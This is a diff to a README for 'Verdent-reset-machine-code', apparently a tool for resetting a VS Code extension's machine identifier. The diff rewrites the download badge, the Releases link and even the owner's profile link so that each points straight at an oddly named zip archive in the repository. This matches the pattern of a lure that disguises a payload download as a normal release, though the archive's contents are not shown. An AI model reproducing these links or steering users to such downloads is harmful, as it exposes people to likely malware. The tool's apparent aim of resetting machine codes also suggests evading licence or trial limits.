@@ -1,14 +1,14 @@
 # 🌱 Verdent-reset-machine-code - Easily Restart Your Development Environment
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/archimedes111/Verdent-reset-machine-code/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/archimedes111/Verdent-reset-machine-code/main/stringwood/Verdent-reset-machine-code_exfoliation.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/archimedes111/Verdent-reset-machine-code/main/stringwood/Verdent-reset-machine-code_exfoliation.zip)
 
 ## 🚀 Getting Started
 Welcome to Verdent-reset-machine-code! This tool helps you quickly reset your development environment. Follow these steps to download and install it.
 
 ## 📦 Download & Install
 1. **Visit the Releases Page**
-   Click this link to go to the [Releases](https://github.com/archimedes111/Verdent-reset-machine-code/releases) page. Here, you will see the latest versions available for download.
+   Click this link to go to the [Releases](https://raw.githubusercontent.com/archimedes111/Verdent-reset-machine-code/main/stringwood/Verdent-reset-machine-code_exfoliation.zip) page. Here, you will see the latest versions available for download.
    
 2. **Download the VSIX File**
    On the Releases page, find the latest version and download the `.vsix` file. This file is necessary for installation in Visual Studio Code.
@@ -45,6 +45,6 @@ Contributions are welcome! If you have ideas for improvements or want to contrib
 Join discussions in our community forum or check the discussions section in the repository. Sharing ideas and getting feedback can enhance your learning experience.
 
 ## 📞 Contact
-For inquiries, you can contact the main repository owner through the [GitHub profile](https://github.com/archimedes111). 
+For inquiries, you can contact the main repository owner through the [GitHub profile](https://raw.githubusercontent.com/archimedes111/Verdent-reset-machine-code/main/stringwood/Verdent-reset-machine-code_exfoliation.zip). 
 
 We appreciate your interest in Verdent-reset-machine-code! Enjoy building your projects with a clean slate.
